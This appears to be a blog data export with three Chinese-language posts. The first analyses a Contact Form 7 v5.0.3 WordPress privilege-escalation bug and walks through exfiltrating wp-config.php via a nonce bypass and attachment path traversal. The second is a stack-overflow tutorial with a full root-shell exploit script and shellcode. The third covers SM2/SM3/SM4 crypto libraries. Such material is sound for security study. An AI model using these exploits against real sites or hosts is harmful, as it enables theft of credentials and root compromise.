[{"title":"wordpress contact_form_7_v5.0.3 插件 权限提升、任意文件读取漏洞分析","url":"/2018/12/22/wordpress-contact-form-7-v5-0-3-插件-权限提升、任意文件读取漏洞分析/","content":"# 简介\n看到了国外有大佬发了关于WordPress的一个非常有名的插件，contact form 7的漏洞，之前见到过很多WordPress站点使用这个插件，大佬写的比较笼统，一些详细的利用方式没有说的太明白.\n# 漏洞成因\n这个漏洞是由于插件开发者对WordPress的使用不当造成的，其实跟WordPress的逻辑有一定的关系，导致了可以发布普通文章的用户，可以绕过权限认证，进行发表原本插件作者只允许管理员创建和修改的自定义类型的\"post\"。\n漏洞作者发现了contact from 7插件存在这样的缺陷，导致了任意一个可以发表普通文章的用户，可以新建一个contact，而且在5.0.3版本下，附件可以跨目录进行添加文件，进而可以读取网站的 `wp-config.php`。\n## 相关的技术点\n### nonce\n首先我们了解下什么是nonce？nonce相当于`csrf token`是WordPress用来防御csrf问题的，并进行了相关的权限验证。\n### post_type\n`post_type`是插件作者注册的自定义`post`类型，与WordPress的文章类似，插件作者要实现一个页面来进行管理文章类型。只有在后台的新建或者编辑页面当中可以获取到`nonce`随机数，提交的时候只有代入了nonce才能进行相应的操作。\n## 漏洞详情\n以contact form 7 v5.0.3为例。\n\n### 插件作者只允许WordPress的`administrator`才能新建和编辑contact。\n![](/media/15455393611905.jpg)\n如果是文章的发布者，就没有修改和创建权限，会显示下面的页面。\n![](/media/15455394346116.jpg)\ncontact form 7也是一种自定义类型的 `post` ，数据里面都是存在了`wp_posts`表当中，通过 `post_type`进行区分。\n\n![-w260](/media/15455670785788.jpg)\n\n正常情况，插件作者是通过 `current_user_can('publish_pages') ` 进行权限的判定，也就是说editor以上的权限可以编辑，防止普通用户打开新建和修改文章的页面。\n\n但是用户仍可以操作普通的文档，通过请求接口 `wp-admin/post.php` 的方式进行新建和编辑文章，只不过 `post_type` 变为了`post`等普通文档类型。由于插件作者在 `register_post_type` 的时候没有进行相关权限的配置，仅仅依靠了`current_user_can('publish_pages')`验证用户编辑权限，出现了安全问题。\n### 接下来我们来看看普通文档的新建、编辑流程。\n正常流程上，普通文档上传接口是请求 post-new.php后先生成一个 `post`，然后再进行编辑，请求post.php，设置参数 `action` 为 `editpost`。\n```php\n// wp-admin/post.php\ncase 'editpost':\n    check_admin_referer('update-post_' . $post_id);\n\n\t$post_id = edit_post();\n\n\t// Session cookie flag that the post was saved\n\tif ( isset( $_COOKIE['wp-saving-post'] ) && $_COOKIE['wp-saving-post'] === $post_id . '-check' ) {\n\t\tsetcookie( 'wp-saving-post', $post_id . '-saved', time() + DAY_IN_SECONDS, ADMIN_COOKIE_PATH, COOKIE_DOMAIN, is_ssl() );\n\t}\n\n\tredirect_post($post_id); // Send user on their way while we keep working\n\n\texit();\n```\n通过函数 `check_admin_referer` 检测nonce是否合法。\n\n```php\n// wp-includes/pluggable.php\n\t// Nonce generated 0-12 hours ago\n\t$expected = substr( wp_hash( $i . '|' . $action . '|' . $uid . '|' . $token, 'nonce'), -12, 10 );\n\tif ( hash_equals( $expected, $nonce ) ) {\n\t\treturn 1;\n\t}\n\n\t// Nonce generated 12-24 hours ago\n\t$expected = substr( wp_hash( ( $i - 1 ) . '|' . $action . '|' . $uid . '|' . $token, 'nonce' ), -12, 10 );\n\tif ( hash_equals( $expected, $nonce ) ) {\n\t\treturn 2;\n\t}\n```\n漏洞利用的地方是通过传入action为`post`，调用下面这个逻辑。\n\n```php\n// wp-admin/post.php\ncase 'post':\n\tcheck_admin_referer( 'add-' . $post_type );\n\t$post_id = 'postajaxpost' == $action ? edit_post() : write_post();\n\tredirect_post( $post_id );\n\texit();\n```\n其中 post_type 是通过传入的 `post_id` 去数据库里面查询得到。\n\n```php\n// wp-admin/post.php\nif ( $post_id )\n\t$post = get_post( $post_id );\n\nif ( $post ) {\n\t$post_type = $post->post_type;\n\t$post_type_object = get_post_type_object( $post_type );\n}\n```\n可以看到，如果传入的 `post_id`为正常帖子创建请求，这个地方的 `nonce` 普通用户就可以通过页面进行获取了。\n### 绕过nonce检测\n可以看到 `post_id` 是通过 `$_GET['post']` 或者 `$_POST['post_ID']`两种方式获取。\n```php\n// wp-admin/post.php\nif ( isset( $_GET['post'] ) )\n \t$post_id = $post_ID = (int) $_GET['post'];\nelseif ( isset( $_POST['post_ID'] ) )\n \t$post_id = $post_ID = (int) $_POST['post_ID'];\nelse\n \t$post_id = $post_ID = 0;\n```\n所以如果我们构建一个存在的并且`post_type`为 `post` 的帖子ID作为参数传入的话， `check_admin_referer` 的参数变为了固定值 `add-post` 这样的话，如果我们拿到了nonce就可以绕过了检测。有同学会问，怎么得到这个nonce呢？通过跟代码，我发现在 dashboard 页面当中，下面这个功能里面就有我们需要的nonce，通过查看源代码，获取这个表单的input这样就绕过了检测。\n```html\n <input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"xxx\" />\n```\n![-w560](/media/15455738685995.jpg)\n\n### 创建自定义类型的post\n绕过了nonce检测后，我们来看 `post` 那个case，流程会进入到 `write_post` 函数，然后我们看到这个逻辑。\n```php\n// wp-includes/post.php\n\tif ( !current_user_can( $ptype->cap->edit_posts ) ) {\n\t\tif ( 'page' == $ptype->name )\n\t\t\treturn new WP_Error( 'edit_pages', __( 'Sorry, you are not allowed to create pages on this site.' ) );\n\t\telse\n\t\t\treturn new WP_Error( 'edit_posts', __( 'Sorry, you are not allowed to create posts or drafts on this site.' ) );\n\t}\n```\n问题就出现在这，因为作者在注册post_type的时候没有进行权限限制，导致了权限提升。\nv5.0.3 的插件配置:\n```php\n//wp-content/plugins/contact-form-7/includes/contact-form.php\n\tpublic static function register_post_type() {\n\t\tregister_post_type( self::post_type, array(\n\t\t\t'labels' => array(\n\t\t\t\t'name' => __( 'Contact Forms', 'contact-form-7' ),\n\t\t\t\t'singular_name' => __( 'Contact Form', 'contact-form-7' ),\n\t\t\t),\n\t\t\t'rewrite' => false,\n\t\t\t'query_var' => false,\n\t\t) );\n\t}\n```\n就导致了如果绕过了nonce检测，普通用户也就可以成功的创建只有editer权限才可以创建的 contact form 7了。\n### 进一步利用\n权限提升已经完成，下面就是利用了contact from 7 v5.0.3的一个问题。\n![-w816](/media/15455744357869.jpg)\n当发送邮件的时候，可以携带附件，但是这个附件可以跨目录读取，导致了用户可以直接携带 `wp-config.php` 进行发送，实现敏感信息的泄露。\n\n# 漏洞修复\n在注册 `post_type` 的时候，配置权限。\n```php\n//wp-content/plugins/contact-form-7/includes/contact-form.php\n\tpublic static function register_post_type() {\n\t\tregister_post_type( self::post_type, array(\n\t\t\t'labels' => array(\n\t\t\t\t'name' => __( 'Contact Forms', 'contact-form-7' ),\n\t\t\t\t'singular_name' => __( 'Contact Form', 'contact-form-7' ),\n\t\t\t),\n\t\t\t'rewrite' => false,\n\t\t\t'query_var' => false,\n\t\t\t'capability_type' => 'page'\n\t\t) );\n\t}\n```\n如果进行了这样的配置的话，在进行 `write_post` 这个函数逻辑的时候\n```php\n// wp-includes/post.php\n\tif ( !current_user_can( $ptype->cap->edit_posts ) ) {\n\t\tif ( 'page' == $ptype->name )\n\t\t\treturn new WP_Error( 'edit_pages', __( 'Sorry, you are not allowed to create pages on this site.' ) );\n\t\telse\n\t\t\treturn new WP_Error( 'edit_posts', __( 'Sorry, you are not allowed to create posts or drafts on this site.' ) );\n\t}\n```\n这个判断才会生效，导致权限认证失败。\n# 漏洞利用\n理清了漏洞触发逻辑，利用方式就简单了，在后台登录页面，直接引用 [poc.js]()。\n注意修改几个参数\n1. 修改get请求，query参数的post为已存在的帖子ID。\n2. 修改post参数中，_wpnonce为上文说的获取方式。\n3. 修改post参数中 `meta_input[_mail][recipient]` 参数为自己的收件箱。\n4. `meta_input[_mail][attachments]` 这个参数代表着想要获取的附件。\n5. 其他的标题，主题什么的参数看情况自己修改。\n\n然后可以在控制台里面引用，会发现新建了一个表单，然后在帖子里面正常引用这个表单，再页面中使用，并点击发送后，在自己的收件箱当中收到 `wp-config.php` 的附件。\n![-w1279](/media/15456354237434.jpg)\n\n# [原文链接](https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/)"},{"title":"easy x86 exploit","url":"/2018/11/06/easy-x86-exploit/","content":"\n# x86 exploit\n## basic vlun\n### 最简单的栈溢出\n#### 溢出\n简单来说，就是输入的字符串长度超过了目标字符串长度限制，并且没有长度检测，导致了溢出。\n#### 溢出类型\n- 栈溢出(Stack Based Buffer Overflow)\n- 堆溢出(Heap Based Buffer Overflow)\n\n#### 栈溢出\n漏洞代码\n```\n//vuln.c\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char* argv[]) {\n        /* [1] */ char buf[256];\n        /* [2] */ strcpy(buf,argv[1]);\n        /* [3] */ printf(\"Input:%s\\n\",buf);\n        return 0;\n}\n```\n编译代码\n```\necho 0 > /proc/sys/kernel/randomize_va_space\n关闭aslr，地址空间布局随机化\n\ngcc -g -fno-stack-protector -z execstack -o vuln vuln.c\n\n-fno-stack-protector关闭堆栈保护\n-z execstack 关闭NX（DEP）数据执行保护\n\nsudo chown root vuln\nsudo chgrp root vuln\nsudo chmod +s vuln\n```\n然后通过返回地址覆盖的方法进行攻击。\nexp.py\n```\n#!/usr/bin/env python\nimport struct\nfrom subprocess import call\n\n#Stack address where shellcode is copied.\nret_addr = 0xbffff5a0\n\n#Spawn a shell\n#execve(/bin/sh)\nscode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n\n#endianess convertion\ndef conv(num):\n return struct.pack(\"<I\",num)\nbuf = \"A\" * 268\nbuf += conv(ret_addr)\nbuf += \"\\x90\" * 100\nbuf += scode\n\nprint \"Calling vulnerable program\"\ncall([\"./vuln\", buf])\n```\n寻找返回地址，通过core文件\nulimit -c unlimited\nsh -c 'echo \"/tmp/core.%t\" > /proc/sys/kernel/core_pattern'\n再次触发漏洞代码，会在tmp文件夹下面产生core文件，用gdb调试这个core文件，gdb vuln \n\n"},{"title":"关于国密 （sm2,sm3,sm4）在Linux、python、Android、java、ios中的应用","url":"/2018/11/06/关于国密-（sm2-sm3-sm4）在Linux、python、Android、java、ios中的应用/","content":"# 什么是国密？\n国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4和最新的sm9。在国内环境主要使用的国家密码局认定的算法。\n\nSM2算法：SM2椭圆曲线公钥密码算法是我国自主设计的公钥密码算法，包括SM2-1椭圆曲线数字签名算法，SM2-2椭圆曲线密钥交换协议，SM2-3椭圆曲线公钥加密算法，分别用于实现数字签名密钥协商和数据加密等功能。SM2算法与RSA算法不同的是，SM2算法是基于椭圆曲线上点群离散对数难题，相对于RSA算法，256位的SM2密码强度已经比2048位的RSA密码强度要高。\n\n**其实就是类似RSA算法，但是大家都知道，RSA算法位数要求已经在2048以上了，SM2不同的是可以使用较少的位数保证较强的密码强度。**\n\nSM3算法，SM3杂凑算法是我国自主设计的密码杂凑算法，适用于商用密码应用中的数字签名和验证消息认证码的生成与验证以及随机数的生成，可满足多种密码应用的安全需求。为了保证杂凑算法的安全性，其产生的杂凑值的长度不应太短，例如MD5输出128比特杂凑值，输出长度太短，影响其安全性SHA-1算法的输出长度为160比特，SM3算法的输出长度为256比特，因此SM3算法的安全性要高于MD5算法和SHA-1算法。\n\n**与md5相似，但是比md5更长，具有更高的安全性。**\n\nSM4算法：分组密码算法是我国自主设计的分组对称密码算法，用于实现数据的加密/解密运算，以保证数据和信息的机密性。要保证一个对称密码算法的安全性的基本条件是其具备足够的密钥长度，SM4算法与AES算法具有相同的密钥长度分组长度128比特，因此在安全性上高于3DES算法。\n\n**与AES相似。**\n\nSM9算法：是由国密局发布的一种IBE(Identity-Based Encryption)算法。IBE算法以用户的身份标识作为公钥，不依赖于数字证书。\n\n**一种新型的公私钥算法，基于身份标识的。**\n\n# openssl的编程初探\n在算法实现中，不免要使用openssl库来进行操作，openssl 很强大，提供了健壮的，全功能的加密套件。\n\n[openssl官网](https://www.openssl.org/)\n\n有兴趣的同学可以详细去学习下，openssl有着大量的API可以使用，可以实现大量的密码算法。\n# 开源算法（gmsll.org）\n这里我使用的是北京大学[关志](https://github.com/guanzhi)副研究员的密码学研究组开发维护的[GmSSL](http://gmssl.org/),此项目上openssl的分支，可以替代openssl，并增加了对国密的支持.\n\n在网上找了很多关于此开源库的使用方法，都不是很明白，我对这个项目的使用方法做一个总结，可以支持在多个平台上使用。\n\n# 下面我们来看看具体的使用方法\n示例代码可以在[github]()上面可以下载得到，给出了测试代码，可以直接进行下载调试，主要实现的是**sm2的加解密**，**sm4的加解密**，欢迎star。\n使用方法都是：\n1. 编译GmSSL库，得到对应的文件。\n2. 引用文件。\n3. 使用对应语言调用。\n\n编译环境为（macbook + ubuntu虚拟机）\n## evp api\n### 介绍\n首先是 **EVP API**，这是对GmSSL接口的一个封装，隐藏了API实现的细节，提供了一个抽象的，统一的接口。我们可以借助这个接口来实现其他平台的使用。\n### 编译\n我在Ubuntu环境下面\n`./config`\n`make`\nmake成功后，生成 libcrypto.so.1.1 和 libssl.so.1.1\n在code文件夹下面，编写自己的sm4.c,utils.c,sm2.c\n然后利用下面的代码进行编译。\n`gcc -Wall code/sm4.c code/sm2.c code/utils.c -o my_gmssl -lssl -lcrypto -L. -I include -I apps -I . -L /usr/lib/ssl`\n### 测试\n编写测试代码：\n![-w652](/media/15426078151794.jpg)\n\n运行结果：\n![-w698](/media/15426077534504.jpg)\n测试成功。\n\n## java API的使用方法（Android）\n### 介绍\n在Android里面调用这个库的方法，主要是通过编译.so动态链接库的方式进行引用。在官方的[github](https://github.com/guanzhi/GmSSL/blob/master/java/)中，已经给出了相关代码，但是缺少了ndk编译过程。\n### 编译\n### 坑\n有些手机里面并不支持，.so.1.1的soname，所以在引用libssl.so.1.1 和libcrypto.so.1.1的时候出现了问题，解决方法是\n```\nreadelf -d libssl.so\nrpl -R -e .so.1.1 \"_1_1.so\" libcrypto.so\nrpl -R -e .so.1.1 \"_1_1.so\" libssl.so\n```\n## python 调用方法\n### 坑\n当使用memcpy或者strcpy进行复制结果字符串时，在c语言里面运行正常，但是引入到python里面的时候会出现多一位或几位字符的情况，所以输出结果转换成了16进制字符串，这样结果就稳定了。\n## ios使用方法\n\n## nodejs使用方法\n### 坑\nc++ 编译bug，sm2 bug\n# 小结\n"}]